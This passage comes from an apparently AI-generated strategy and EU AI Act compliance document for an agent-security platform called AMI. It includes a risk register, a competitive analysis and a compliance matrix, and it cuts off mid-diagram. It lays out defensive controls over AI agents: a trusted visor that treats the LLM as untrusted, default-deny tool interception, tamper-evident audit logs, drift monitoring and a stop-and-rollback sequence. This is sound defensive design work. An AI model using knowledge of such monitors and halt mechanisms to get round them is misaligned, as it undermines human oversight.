| **Decision: ISO 27001 first (sells to procurement teams). SOC 2 second (sells to CISO/DPO). ISO 42001 third (sells to AI governance). Ship all three by Sep 2027.** |

**Battle 5: Open-Source Community + MCP Security Standard**

| Aspect | Assessment |
|---|---|
| Current status | Small community. MCP has zero security. |
| Required state | AMI is the de facto MCP security layer. Open-source MCP security library. AMI benchmark published. |
| Effort | MCP security library (Q2 2027); benchmark (Q3 2027); ongoing community building |
| Strategic value | Ecosystem lock-in. If AMI defines "MCP security", every deployment needs AMI. |
| **Decision: Contribute MCP security library upstream. Publish AMI benchmark. Build community around agent security.** |

### 7.3 Strategic Risk Register

| Risk ID | Description | Probability | Impact | Mitigation | Residual Risk |
|---|---|---|---|---|---|
| R1 | EU AI Act compliance deadline missed | Medium | **Critical** (no EU market access; regulatory penalty) | 4 parallel tracks; cert body engaged Week 1; 10-week sprint | Low-Medium |
| R2 | Prompt injection defence fails under adaptive attack | High | **High** (product promises unfounded) | Semantic Visor structural prevention; continuous red-teaming; academic community engagement | Medium |
| R3 | ISO 27001/SOC 2 timeline slips 6+ months | Medium | **High** (enterprise procurement blocked) | Early cert body engagement; dedicated compliance engineer; automated evidence pipeline | Low-Medium |
| R4 | Key engineer departure (single-bus risk) | Medium | **High** (consistency loss; knowledge gaps) | Cross-training; comprehensive docs; open-source community for resilience | Medium |
| R5 | Open-source MCP library rejected by community | Low | **Medium** (loss of ecosystem advantage) | Build as shop-front architecture: contributes to MCP community, but AMI is independent; contribute regardless | Low |
| R6 | FAANG ships equivalent semantic virtualization | Low | **Medium** (competitive pressure) | 6-9 month first-mover advantage; open-source; platform-agnostic positioning; regulatory moat (EU AI Act) | Low-Medium |
| R7 | Emerging agent protocols (A2A, MCP) fragment | Medium | **Low-Medium** (integration cost) | Abstract over protocols; AMI as security layer regardless of protocol | Low |
| R8 | Hardware shortage (AMD SEV-SNP / Intel TDX) | Medium | **Medium** (CC delayed) | Software TEE fallback (Kata without HW); support both AMD and Intel | Low-Medium |
| R9 | New regulatory requirement (e.g., state-level AI law) | High | **Medium** (additional compliance cost) | Modular compliance framework; design for multi-jurisdiction from start | Medium |
| R10 | VC-funded competitor emerges with specific agent security focus | High | **Medium** (funding advantage) | Open-source moat; first-mover; certifications; MCP ecosystem | Medium |

### 7.4 Key Insights from Research

#### What We Learned That We Did Not Know Before

1. **Prompt injection is structurally inescapable.** Not a vulnerability - a property of the LLM interface. No model will ever be immune. Containment (semantic virtualization) is the only viable strategy.

2. **Every major incident was preventable with existing technology.** PocketOS could have been sandboxed. Kiro could have been permission-gated. Claude Code could have had a timeout. AUSPEX could have had CI/CD gating. The problem is not lack of tools - it is lack of integration.

3. **No one combines all four layers.** FAANG does guardrails (isolated). Startups do guardrails or orchestration (fragmented). Neoclouds do infrastructure (no guardrails). AMI is uniquely positioned to span application security + orchestration + infrastructure + compliance.

4. **EU AI Act is the accelerator.** The compliance deadline creates urgency for every enterprise deploying AI agents. AMI's ability to say "we are certified for EU AI Act compliance on Day 0" is a procurement-shattering advantage.

5. **Academic consensus favors containment over detection.** The most cited papers (AgentVisor, arXiv 2604.24118; arXiv 2605.17634) all converge on structural separation. Detection is useful but not sufficient.

6. **Multi-agent security is barely studied.** G-Safeguard (Jun 2026) is the first paper on multi-agent delegation security. The field is 6-12 months behind single-agent security. This is an opening.

7. **MCP protocol is the soft underbelly.** 3,200+ servers, zero security. AMI's MCP security gateway is a wedge into every agent deployment.

8. **Hooks pipeline v4 is the right abstraction.** SPEC-HOOKS.md Phase 2 (LLM-in-loop validators, guarded/isolated/high-security profiles) maps directly to the compliance requirements. The pipeline architecture is correct - it just needs the security primitives built.

9. **Certifications matter more than features.** In enterprise procurement, SOC 2 and ISO 27001 are table stakes. FAANG has 5/5 certifications. Startups average 2.5/5. AMI has zero. Without certifications, AMI needs architectural exceptions - which kill sales velocity.

10. **2026-2028 is the "trust window" for agents.** After the PocketOS, Kiro, and Claude Code incidents, the market is nervous but not yet frozen. Every major incident raises the bar. By 2028, agent security will be table stakes. AMI must be the table by then.

### 7.5 Competitive Landscape Summary

| Dimension | FAANG | Startups | Neoclouds | AMI Target | AMI Current |
|---|---|---|---|---|---|
| Guardrails | ✅ Bedrock, Vertex, Purview, CoPilot | ✅ NeMo, Guardrails AI, Lakera | ❌ None | ✅ Semantic visor + tool interception + injection detection | ❌ Hooks pipeline only (no security primitives) |
| Orchestration | ✅ Vertex AI, Copilot Studio | ✅ LangChain, CrewAI, AutoGen | ❌ None | ✅ A2A + multi-agent + agent eval | ⚠️ Single-agent only |
| Infrastructure security | ✅ VPC, CMEK, VNet, C3 | ❌ None | ✅ DPU, gVisor, CC, Firecracker | ✅ gVisor + CC + seccomp + loadouts | ⚠️ WORKSPACE-GUARD research only |
| Compliance evidence | ✅ SOC/ISO reports, Artifact | ✅ SOC 2 docs | ✅ SOC/ISO reports | ✅ ISO 27001 + SOC 2 + ISO 42001 | ❌ Zero certifications |
| Data sovereignty | ✅ Assured Workloads, Azure EU | ✅ Mistral EU, Aleph DC | ✅ Scaleway, Hetzner | ✅ Local-first: no SaaS, no telemetry | ✅ Local-first already |
| Platform lock-in | 🔒 High | 🔄 Varies | 🔄 Varies | 🔓 Any LLM, any infra, any framework | 🔓 Any LLM, any infra, any framework |
| Open source | ❌ Proprietary | ⚠️ Partial | ⚠️ Partial | ✅ Full open source | ✅ Full open source |
| MCP security | ❌ None | ❌ None | ❌ None | ✅ MCP security gateway (Q3-Q4 2026) | ❌ Not started |
| EU AI Act ready | ⚠️ Partial | ⚠️ Partial | ❌ None | ✅ Full compliance package (2 Aug 2026) | ❌ Zero compliance |

### 7.6 AMI Current State vs. Target State

| Capability | Current (Jun 2026) | Target (Sep 2027) |
|---|---|---|
| Prompt injection defence | None (hooks pipeline only) | Semantic Visor with STI protocol; near-zero ASR |
| Tool-call interception | None | Default-deny tool permissions; schema validation; taint propagation |
| Audit trail | Mutable session transcripts | Hash-chain audit log with append, replay, verify, SIEM export |
| Stop button / reversal | None | Safe halt from any yield point; action reversal with checkpoint |
| Code execution safety | Host-level (no sandbox) | gVisor sandbox with blocked network; read-only workspace |
| Sandbox escape research | Research document (WORKSPACE-GUARD) | Production sandbox with escape test suite |
| Agent identity | None | Signed agent manifests; A2A mutual authentication |
| Multi-agent security | None | Delegation depth tracking; circular detection; A2A security protocol |
| Behaviour drift detection | None | ProbGuard: behavioural profiles, deviation alerts within 38s |
| Memory security | Plaintext in-memory only | Cryptographic signing + verification; AgentSafe hierarchical; FHE (Q3 2027) |
| Confidential computing | None | Kata + TDX + CC; CPU+GPU composite attestation |
| Security loadouts | SPEC-HOOKS.md design only | 4 profiles (guarded, isolated, high-security, development) enforced at deployment |
| MCP security | None | Gateway with signed manifests; deny-unknown-servers; tool permission model |
| Certifications | None | ISO 27001, SOC 2 Type II, ISO 42001 |
| EU AI Act compliance | None | Full compliance package including Art. 6, 9, 11-12, 14, 15, 26 |
| Neocloud deployment | Manual | `ami deploy --neocloud` with CoreWeave, Modal, Scaleway, Hetzner |
| Observability | Console logging only | OTEL traces in Jaeger; SIEM exporters (syslog, Kafka, CloudWatch) |
| Formal verification | None | DSL runtime monitors; >90% attack detection; <1% task degradation |
| Competitive position | Undefined | Only cross-layer agent security platform; certifiable; multi-jurisdiction |

### 7.7 The 7 Strategic Pillars

```
┌─────────────────────────────────────────────────────────────┐
│                    AMI STRATEGIC PILLARS                      │
├──────────┬──────────┬──────────┬──────────┬──────────┬───────┤
│   VISOR   │   AUDIT   │  TOOL    │ STOP +   │  MCP     │ A2A    │
│ Semantic  │  Hash-    │ Intercept │ REVERSE  │ Gateway  │ Secure │
│ Virtualiz.│  Chain    │  Layer    │ Art. 14  │ Signing  │ Multi- │
│ (T1/T2)   │ (T18/T20) │ (T3/T4)  │ (T18)    │ (T19)    │ (T7)   │
├──────────┴────┬──────┴────┬─────┴─────┬────┴──────┬────┴───────┤
│    CONTAIN    │   PROVE   │   GATE    │   STOP    │   SECURE    │
│  Injection   │ Integrity  │   Agency  │   Execute │  Ecosystem  │
├───────────────┴───────────┴───────────┴───────────┴────────────┤
│                         FOUNDATION                              │
│              Certifications | Compliance | Sandbox | CC         │
└─────────────────────────────────────────────────────────────────┘
```

**Pillar 1 - Contain Injection (Semantic Visor):** Structural prevention against prompt injection. Treat LLM as untrusted. STI protocol at every action boundary.

**Pillar 2 - Prove Integrity (Hash-Chain Audit):** Immutable, verifiable audit trail for every agent action. EU AI Act Art. 12 compliance. SIEM integration.

**Pillar 3 - Gate Agency (Tool Interception):** Default-deny tool permissions. Schema validation. Taint propagation. Prevents excessive agency.

**Pillar 4 - Stop Execute (Stop Button + Reversal):** Safe halt from any point. Action reversal. EU AI Act Art. 14 compliance.

**Pillar 5 - Secure Ecosystem (MCP Gateway):** Signed tool manifests. Deny-unknown-servers. Tool permission model. MCP as attack surface.

**Pillar 6 - Secure Federation (A2A Protocol):** Signed agent identity. Delegation depth tracking. Circular delegation prevention.

**Pillar 7 - Foundation (Certifications + Compliance + Sandbox + CC):** ISO 27001, SOC 2, ISO 42001. gVisor sandbox. Confidential computing. Security loadouts.

### 7.8 Closing Statement

The next 18 months will determine whether AMI is an enterprise-grade agent security platform or a promising research project. The EU AI Act compliance deadline in 10 weeks is the forcing function - everything converges on 2 Aug 2026.

The research is clear: prompt injection is inescapable, multi-agent security is undefined, MCP is an open wound, certifications are table stakes, and the market is looking for a cross-layer solution that does not exist today.

AMI's window of opportunity is real but finite. Every major incident (PocketOS, Kiro, Claude Code, AUSPEX, Tier-0 LLM) validates the problem space. Every month without shipping narrows the window.

**Three truths for the next 18 months:**

1. **Containment over prevention** - Semantic virtualization, not better prompt engineering. The approach MUST be structural, not behavioral.

2. **Certifications over features** - ISO 27001 opens more doors than any feature. SOC 2 keeps them open. ISO 42001 closes the loop. Engineering must support compliance, not compete with it.

3. **Multi-agent security built-in, not bolted-on** - A2A security cannot be an afterthought. The damage from an insecure multi-agent ecosystem dwarfs single-agent incidents. Build it right from the start.

The AMI codebase has the right bones - SPEC-HOOKS.md shows architectural foresight, WORKSPACE-GUARD shows research depth, and the local-first/open-source posture is strategically correct. But there is a gap between architectural vision and production reality.

**Close that gap in the next 10 weeks. Then build the moat. Then certify the platform.**

---

*This synthesis document was generated from six research workstreams:*
- *WS-1: FAANG Guardrails Analysis (Bedrock, Vertex AI, Purview, Copilot)*
- *WS-2: SME Ecosystem Analysis (NVIDIA NeMo, Guardrails AI, Lakera, LangChain, etc.)*
- *WS-3: Neocloud Landscape (CoreWeave, Modal, Fireworks, Together, etc.)*
- *WS-4: Regulatory Deep Dive (EU AI Act, ISO 42001, NIST AI RMF 1.0, OWASP LLM Top 10)*
- *WS-5: Academic Landscape (84 papers annotated, arXiv 2024-2026)*
- *WS-6: Incidents & Milestones (25+ documented incidents, benchmarks)*

*Anchored to AMI codebase: ami/core/policies/engine.py, projects/WORKSPACE-GUARD/, docs/specifications/SPEC-HOOKS.md, projects/docs/WORKSPACE-VM-OVERVIEW.md, README.md*

*Research period: Jun 2026 | Analyst: AI Agent | Review cycle: Continuous*

## Appendix A: EU AI Act Article-by-Article Compliance Mapping

### A.1 Classification Framework (Art. 6 - High-Risk Determination)

| Criterion | Assessment | AMI Status | Required Action |
|---|---|---|---|
| Safety component of regulated product | Depends on deployment; AMI agents managing medical devices, aviation, automotive safety fall here | TBD per deployment | Classification audit required per deployment |
| AI system listed in Annex III (biometrics, critical infra, education, employment, law enforcement, migration, admin of justice) | AMI's deployer determines Annex III applicability | TBD per deployment | Deployer questionnaire in compliance toolkit |
| Deployer uses AMI in high-risk context | AMI is the AI system provider under Art. 3(2) | TBD | AMI must assume high-risk classification for any enterprise deployment; build compliance for worst case |
| Provider exemption (Art. 6(3)) | Only if AMI is "not intended to replace human judgment" | Not applicable in agent context | Do not rely on exemption - agents make autonomous decisions |

**AMI decision: Self-classify as high-risk system for enterprise deployments. Build compliance package for worst case. Provide deployer classification tool for per-deployment assessment.**

---

### A.2 Article-by-Article Compliance Matrix

| Art. | Requirement | AMI Compliance Target | Deliverable | Timeline | Verification |
|---|---|---|---|---|---|
| **Art. 6** | Classification rules - high-risk determination | Classification framework + deployment checklist | `docs/compliance/HIGH-RISK-CLASSIFICATION.md` | Q3 2026 | Legal review; cert body concurrence |
| **Art. 8** | Compliance requirements for high-risk AI | Full compliance across Articles 9-15 | Compliance matrix with evidence | Q3 2026 | Cross-reference all Art. 9-15 requirements |
| **Art. 9** | Risk management system - continuous, iterative, documented | Risk register + risk treatment plan + RMF | `docs/compliance/RISK-MANAGEMENT.md` + `docs/compliance/RISK-REGISTER.md` | Q3 2026 | Internal audit; cert body review |
| **Art. 9(2)** | Risk identification of known/foreseeable risks | Threat model covering all attack trees in §5.5 | Threat model document | Q3 2026 | Independent threat model review |
| **Art. 9(3)** | Residual risk evaluation + testing | Test suite covering attack scenarios; residual risk acceptance at CISO level | `docs/compliance/RESIDUAL-RISK-STATEMENT.md` | Q3 2026 | CISO sign-off |
| **Art. 9(4)** | Risk management measures tested for effectiveness | Penetration test suite; red-teaming framework | `tests/security/red_team/` framework | Q3 2026 | External pen test |
| **Art. 9(5)** | Post-market monitoring | OTEL traces + drift detection + incident response | `docs/compliance/POST-MARKET-MONITORING.md` | Q4 2026 | Monitoring operational |
| **Art. 9(7)** | Risk mgmt system documented and maintained | Continuous update; risk register reflects current state | Risk register versioned in git | Q3 2026 | Git history shows updates |
| **Art. 10** | Data governance - training, validation, testing data | Applicable only if training custom models (out of scope for current AMI) | Statement: "AMI does not train models" | Q3 2026 | Doc published |
| **Art. 11** | Technical documentation - design, development, purpose, accuracy, robustness, cybersecurity | Full technical documentation package | `docs/compliance/TECHNICAL-DOCUMENTATION.md` | Q3 2026 | Cert body review |
| **Art. 11(1)** | Purpose, accuracy, robustness, cybersecurity specifications | Product specification doc with NIST AI RMF alignment | Product spec document | Q3 2026 | Internal review |
| **Art. 11(2a)** | Development methodology, design choices, system architecture | Architecture decision records (ADR) for every security component | `docs/architecture/` folder with ADRs | Ongoing | Architecture review |
| **Art. 11(2b)** | Data requirements: training datasets, validation, testing | Statement: no model training; third-party models carry own documentation | `docs/compliance/DATA-GOVERNANCE-STATEMENT.md` | Q3 2026 | Legal review |
| **Art. 11(2c)** | Computing resources required | Minimum infrastructure spec doc | `docs/operations/INFRASTRUCTURE-REQUIREMENTS.md` | Q3 2026 | Operations review |
| **Art. 11(2d)** | Accuracy metrics + test results | Agent evaluation harness (NIST dimensions) | Agent eval harness (Q2 2027) | Q2 2027 | Benchmark results published |
| **Art. 11(2e)(i)** | Robustness: system resilience to errors | Semantic Visor fail-closed; tool-call interception default-deny | Fail-closed test suite | Q3 2026 | Pen test: error injection |
| **Art. 11(2e)(ii)** | Robustness: resilience to adversarial inputs | Prompt injection defence; jailbreak detection; taint tracking | Red-team results doc | Q3 2026 | Adaptive red teaming |
| **Art. 11(2f)(i)** | Cybersecurity: resilience against unauthorized access | Tool permissions; MCP gateway; sandbox | Security architecture doc | Q3 2026 | External pen test |
| **Art. 11(2f)(ii)** | Cybersecurity: capacity to prevent manipulation | Hash-chain audit; memory integrity; agent identity signing | Integrity test results | Ongoing | Continuous verification |
| **Art. 12** | Automatic logging over lifetime of high-risk AI system | Hash-chain audit trail with append, replay, verify, export | `ami/core/audit/log.py` | **2 Aug 2026** | Audit integrity tests |
| **Art. 12(1)** | Logging capabilities commensurate with risk | Full action logging + selective detail per risk level | Configurable log level + retention | Q3 2026 | Performance tests |
| **Art. 12(2)(a)** | Log: identification of situations that may result in risk | Anomaly detection + drift detection alerting | `ami/core/security/drift/detector.py` | Q1 2027 | Drift detection tests |
| **Art. 12(2)(b)** | Log: facilitation of post-market monitoring | SIEM exporters (syslog, Kafka, CloudWatch) + structured log format | SIEM exporters | Q4 2026 | SIEM integration test |
| **Art. 12(2)(c)** | Log: monitoring of system operation post-deployment | OTEL traces covering all agent actions | `ami/core/observability/tracing.py` | Q4 2026 | OTEL dashboards |
| **Art. 12(3)** | Log retention period + technical measures to prevent tampering | Hash chain integrity prevents tampering; configurable 3-24 mo retention | Retention policy + integrity verify | Q3 2026 | Integrity test: 1000-chain verify <100ms |
| **Art. 13** | Transparency - labelling, disclosure to deployers | Compliance documentation; deployer toolkit | `docs/compliance/DEPLOYER-TOOLKIT.md` | **2 Aug 2026** | Deployer checklist pass |
| **Art. 13(1)** | System operates with sufficient transparency for deployer interpretation | Documentation: purpose, limitations, accuracy, performance | Product documentation | Q3 2026 | Deployer survey |
| **Art. 13(2)** | Instructions for use - intended purpose, accuracy, limitations | Deployer manual with all required sections | `docs/compliance/INSTRUCTIONS-FOR-USE.md` | Q3 2026 | Cert body review |
| **Art. 13(3)(a-h)** | Characteristics and limitations (8 sub-requirements) | Deployer manual per Art. 13(3) specification | Deployer manual with 8 sub-sections | Q3 2026 | Legal review |
| **Art. 14** | Human oversight - configuration, stop button, reversal | SafeHaltManager + action reversal | `ami/core/agents/interrupt.py` + `reversal.py` | **2 Aug 2026** | Stop button tests |
| **Art. 14(1)** | System designed for effective human oversight | Stop button interface (TUI, API, SIGUSR1); reversal workflow | HMI design doc | Q3 2026 | Human factors test |
| **Art. 14(3)(a)** | Oversight measures built into system before deployment | Guarded loadout enforces stop button; cannot disable | Loadout enforcement tests | Q3 2026 | Pen test: disable stop button |
| **Art. 14(3)(b)** | Oversight measures operationally feasible | Multiple halt paths; configurable halt sequence; resource cleanup | Halt sequence state machine | Q3 2026 | Performance: <5s halt |
| **Art. 14(4)(a)** | Oversight: understand system capabilities and limitations | Documentation + training materials | Training materials | Q3 2026 | Deployer comprehension test |
| **Art. 14(4)(b-c)** | Oversight: monitoring, detection of anomalies | OTEL dashboards + drift detection + anomaly alerting | Monitoring dashboard + alert rules | Q4 2026 | Alert routing test |
| **Art. 14(4)(d)** | Oversight: remain aware of automation bias; decide not to use | Reversal capability - undo any agent action | `ami/core/agents/reversal.py` | **2 Aug 2026** | Reversal tests |
| **Art. 14(4)(e)** | Oversight: intervene or interrupt via "stop button" | SafeHaltManager: interrupt → checkpoint → tool rollback → halt | `ami/core/agents/interrupt.py` | **2 Aug 2026** | Stop within 5s |
| **Art. 14(5)** | Oversight for operator: instructions + stop | Operator instructions in deployer toolkit | Deployer toolkit | **2 Aug 2026** | Checklist pass |
| **Art. 15** | Accuracy, robustness, cybersecurity | Cross-cutting: covered by Art. 11, 12, 14 implementations | All above deliverables | Ongoing | All above tests |
| **Art. 15(1)** | Accuracy: appropriate accuracy metrics reported | Agent eval harness + published benchmarks | Benchmark results | Q2 2027 | Reproducible scores |
| **Art. 15(2)** | Robustness: error resilience + fail-safes | Semantic Visor fail-closed; all tools default-deny | Fail-closed test suite | Q3 2026 | Pen test: error injection 100% blocked |
| **Art. 15(3)** | Cybersecurity: resilience to adversarial manipulation | Full security stack (Visor + tool intercept + sandbox + audit + MCP gateway) | Security stack test suite | Ongoing | Quarterly pen tests |
| **Art. 16** | Provider obligations - quality management, documentation, corrective actions | QMS in ISMS framework (ISO 27001) | ISMS QMS documentation | Q3 2026 | Internal audit |
| **Art. 17** | Quality management system | ISO 27001 ISMS + ISO 42001 AIMS | ISMS + AIMS documentation | Ongoing | ISO audits |
| **Art. 18** | Documentation retention | Git-backed documentation + long-term archive | Documentation in repo | Q3 2026 | Retention policy enforced |
| **Art. 19** | Conformity assessment (Annex III systems - internal control) | Internal compliance audit + cert body engagement | Compliance audit report | **2 Aug 2026** | Cert body concurrence |
| **Art. 21** | Reporting serious incidents | Incident response plan + reporting template | `docs/compliance/INCIDENT-RESPONSE.md` | Q3 2026 | Tabletop exercise |
| **Art. 22** | Corrective actions and duty to inform | QMS corrective action process | QMS documentation | Q3 2026 | Internal audit |
| **Art. 26** | Deployer obligations - deployer toolkit | Full deployer toolkit: retention, suspension, monitoring, notification | `docs/compliance/DEPLOYER-TOOLKIT.md` | **2 Aug 2026** | Deployer checklist |
| **Art. 26(1)** | Deployer: use in accordance with instructions | Instructions for use provided as part of deployer toolkit | `docs/compliance/INSTRUCTIONS-FOR-USE.md` | **2 Aug 2026** | Deployer survey |
| **Art. 26(2)** | Deployer: technical/organisational measures per Art. 9 | Deployer responsibility; AMI provides guidance | Deployer RMF guidance doc | Q3 2026 | Legal review |
| **Art. 26(3)** | Deployer: human oversight per Art. 14 | Overseer training materials | Training materials | Q3 2026 | Cert body review |
| **Art. 26(4)** | Deployer: input data relevance | Deployer responsibility; AMI provides data governance guide | Data governance guide | Q3 2026 | Legal review |
| **Art. 26(5)** | Deployer: monitoring per Art. 15(1) accuracy | OTEL dashboard for deployer monitoring | Deployer monitoring guide | Q4 2026 | Deployer survey |
| **Art. 26(6)** | Deployer: log retention (at least 6 months) | Hash-chain audit default 6-month retention | Retention config | Q3 2026 | Retention test |
| **Art. 26(7)** | Deployer: corrective actions + suspension | Deployer toolkit: suspension procedure | `docs/compliance/DEPLOYER-TOOLKIT.md` | **2 Aug 2026** | Checklist |
| **Art. 26(8)** | Deployer: data protection impact assessment (DPIA) | DPIA template for AMI deployment | DPIA template | Q3 2026 | Legal review |
| **Art. 26(9)** | Deployer: register of high-risk AI systems | AMI provides system register template | System register template | Q3 2026 | Deployer toolkit |
| **Art. 26(10)** | Deployer: cooperation with authorities | Deployer responsibility; AMI provides notification procedures | Notification procedures | Q3 2026 | Legal review |
| **Art. 51-55** | AI Office - market surveillance | Not directly applicable to AMI (applies to authorities) | - | - | - |
| **Art. 71** | Penalties - up to 35M EUR or 7% of turnover | Compliance as above prevents penalties | Evidence of compliance | Ongoing | Continuous verification |

---

### A.3 Harmonised Standards (Expected Jul-Aug 2026)

The EU has requested the following standards from CEN/CENELEC for AI Act presumption of conformity:

| Standard | Scope | AMI Relevance | Readiness |
|---|---|---|---|
| **prEN ISO/IEC 42001** | AI management system | **Directly applicable** - AMI targets this for Sep 2027 | AIMS implementation in roadmap (Q1-Q3 2027) |
| **prEN ISO/IEC 23894** | AI risk management | **Directly applicable** - risk management under Art. 9 | Risk framework in Q3 2026 compliance package |
| **prEN ISO/IEC 25059** | AI system quality model | **Relevant** - quality characteristics for agents | Agent eval harness covers NIST dimensions; align with 25059 when published |
| **prEN ISO/IEC 5338** | AI system lifecycle processes | **Relevant** - engineering processes for AI | Lifecycle management in ISMS Q3 2026 |
| **prEN ISO/IEC 23053** | AI framework | **Contextual** - reference architecture alignment | Architecture decisions already aligned with NIST AI RMF |
| **prEN ISO/IEC 5259 (series)** | Data quality | **Low** - AMI does not train models | Data governance statement sufficient |
| **ETSI GR SAI 005** | AI security | **High** - adversarial attack resilience | Security stack directly addresses this; full coverage Q2 2027 |
| **ETSI GR SAI 006** | AI incident management | **High** - incident response under Art. 21 | Incident response plan Q3 2026 |

**Strategic note:** If harmonised standards are delayed (likely), the compliance burden shifts to demonstrating "state of the art" compliance via existing standards (ISO 27001, ISO 42001, NIST AI RMF). AMI's certification roadmap (ISO 27001 → ISO 42001) is the correct approach regardless of harmonised standard publication date.

---

## Appendix B: Implementation Architecture

### B.1 System Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                        AMI CONTAINER (boot.yaml)                    │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │                      GUARDED LOADOUT                           │  │
│  │  • enforces-review: true  • enforces-loadout: guarded         │  │
│  │  • verify-attached-scopes: true                                │  │
│  ├───────────────────────────────────────────────────────────────┤  │
│  │                    AGENT VISOR LAYER                           │  │
│  │  ┌──────────────┐  ┌────────────────┐  ┌───────────────┐      │  │
│  │  │ GUEST (LLM)  │  │  TRUSTED VISOR  │  │  HOST (Tools) │      │  │
│  │  │  Untrusted   │──│  STI Protocol   │──│   Managed     │      │  │
│  │  │  May be      │  │  • S: Suitabil.│  │   Access:     │      │  │
│  │  │  adversarial │  │  • T: Taint    │  │   Filesystem  │      │  │
│  │  └──────────────┘  │  • I: Integrity│  │   Network     │      │  │
│  │                    └────────────────┘  │   Database    │      │  │
│  │                                        └───────────────┘      │  │
│  ├───────────────────────────────────────────────────────────────┤  │
│  │                   TOOL INTERCEPTION LAYER                      │  │
│  │  ┌─────────────────────────────────────────────────────────┐   │  │
│  │  │  Schema Validate → Permission Check → Taint Check →    │   │  │
│  │  │  Execute → Taint Output → Log → Return                  │   │  │
│  │  └─────────────────────────────────────────────────────────┘   │  │
│  ├───────────────────────────────────────────────────────────────┤  │
│  │                      SECURITY SERVICES                         │  │
│  │  ┌─────────────┐ ┌────────────┐ ┌──────────┐ ┌──────────┐    │  │
│  │  │ Hash-Chain  │ │  Stop/     │ │  gVisor   │ │  MCP     │    │  │
│  │  │ Audit       │ │  Reversal  │ │  Sandbox  │ │  Gateway  │    │  │
│  │  │ (Decision 2)│ │ (Decision4)│ │ (Decision5)│ (Decision3)│   │  │
│  │  └─────────────┘ └────────────┘ └──────────┘ └──────────┘    │  │
│  ├───────────────────────────────────────────────────────────────┤  │
│  │                      OBSERVABILITY                             │  │
│  │  ┌──────────┐ ┌──────────┐ ┌───────────┐ ┌───────────────┐   │  │
│  │  │ OTEL     │ │ SIEM     │ │ Drift     │ │ Agent Eval    │   │  │
│  │  │ Traces   │ │ Exporters│ │ Detection │ │ Harness       │   │  │
│  │  └──────────┘ └──────────┘ └───────────┘ └───────────────┘   │  │
│  ├───────────────────────────────────────────────────────────────┤  │
│  │                 CONFIDENTIAL COMPUTING (Q1+ 2027)              │  │
│  │  ┌─────────────────────────────────────────────────────────┐   │  │
│  │  │  Kata Containers + TDX/SEV-SNP + GPU Composite CC       │   │  │
│  │  └─────────────────────────────────────────────────────────┘   │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │                       AGENT PLATFORM                           │  │
│  │  ┌──────────┐ ┌───────────┐ ┌────────────┐ ┌───────────────┐  │  │
│  │  │ Single-  │ │  A2A      │ │  Multi-    │ │  Memory       │  │  │
│  │  │ Agent    │ │  Protocol │ │  Agent     │ │  (Crypto +    │  │  │
│  │  │ (Current)│ │  (Q4)     │ │  (Q4)      │ │  AgentSafe)   │  │  │
│  │  └──────────┘ └───────────┘ └────────────┘ └───────────────┘  │  │
│  └───────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

### B.2 Hash-Chain Audit Data Model

```
┌──────────────────────────────────────────────┐
│            HASH CHAIN (audit chain)           │
├──────────────────────────────────────────────┤
│ chain_metadata:                               │
│   genesis_hash: <blake3(session_id || epoch)> │
│   last_hash: <blake3(entry_N)>                │
│   entry_count: 1274                           │
│   started_at: 2026-06-15T10:30:00Z            │
│   retention_days: 180                         │
│   signing_key_fingerprint: "ed25519:abc123"   │
├──────────────────────────────────────────────┤
│ ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐       │
│ │Gen.  │→→│Entry 1│→→│Entry 2│→→│Entry 3│→→...│
│ │Hash  │  │  H1   │  │  H2   │  │  H3   │     │
│ └──────┘  └──────┘  └──────┘  └──────┘       │
└──────────────────────────────────────────────┘

Entry Schema:
{
  "version": 1,
  "timestamp_ns": 638894568000000000,
  "event_type": "tool_call" | "tool_result" | "llm_query" | "llm_response" | "session_start" | "session_end" | "stop_button_press" | "error",
  "payload": {
    "tool_name": "file_read",
    "parameters": {"path": "/workspace/config.yaml", "taint_level": "user_direct"},
    "result_summary": {"bytes_read": 1024, "truncated": false},
    "injection_risk_score": 0.02
  },
  "taint_level": "user_direct" | "tool_output" | "retrieved_document" | "untrusted_external",
  "prev_entry_hash": "blake3:abc...",
  "entry_hash": "blake3:def...",
  "nested_span_id": "otels:span:12345"
}
```

### B.3 Semantic Visor STI Protocol

```
LLM (Guest)           Trusted Visor               Host (Environment)
     │                      │                             │
     │  1. Action Request   │                             │
     │─────────────────────→│                             │
     │                      │  2. S: Suitability Check    │
     │                      │  ├── Is action allowed?     │
     │                      │  ├── Is action in scope?    │
     │                      │  └── Is sequence valid?     │
     │                      │                             │
     │                      │  3. T: Taint Analysis       │
     │                      │  ├── Input taint level      │
     │                      │  ├── Action trust required  │
     │                      │  └── Taint threshold check  │
     │                      │                             │
     │                      │  4. I: Integrity Check      │
     │                      │  ├── Session integrity?     │
     │                      │  ├── Agent identity valid?  │
     │                      │  └── State not tampered?    │
     │                      │                             │
     │                      │  5. Decision                │
     │                      │  ├── ALLOW (pass through)   │
     │                      │  ├── DENY (fail closed)     │
     │                      │  ├── CONFIRM (prompt user)  │
     │                      │  └── ESCALATE (need auth)   │
     │                      │                             │
     │                      │  6. Execute (if ALLOW)      │
     │                      │────────────────────────────→│
     │                      │                             │
     │                      │  7. Taint Output            │
     │                      │  ←──────────────────────────│
     │  8. Filtered Result  │                             │
     │  ←───────────────────│                             │
```

### B.4 Agent Lifecycle with Interrupt

```
                    ┌─────────────────┐
                    │  SESSION START  │
                    │  genesis hash   │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │   LLM QUERY     │
                    │  (unwrap one    │
                    │   step)         │
                    └────────┬────────┘
                             │
              ┌──────────────┼──────────────┐
              │              │              │
     ┌────────▼───────┐     │    ┌─────────▼────────┐
     │ STOP PRESSED   │     │    │  INTERRUPT       │
     │ (Ctrl+C/SIGUSR1)│     │    │  (exception)     │
     └────────┬───────┘     │    └─────────┬─────────┘
              │              │              │
     ┌────────▼───────┐     │              │
     │ CANCEL QUEUED  │     │              │
     │ TOOL CALLS     │     │              │
     └────────┬───────┘     │              │
              │              │              │
     ┌────────▼───────┐     │              │
     │ CHECKPOINT     │     │              │
     │ STATE          │     │              │
     └────────┬───────┘     │              │
              │              │              │
     ┌────────▼───────┐     │              │
     │ ROLLBACK LAST  │     │              │
     │ TOOL ACTION(S) │     │              │
     └────────┬───────┘     │              │
              │              │              │
     ┌────────▼───────┐     │              │
     │ RELEASE        │     │              │
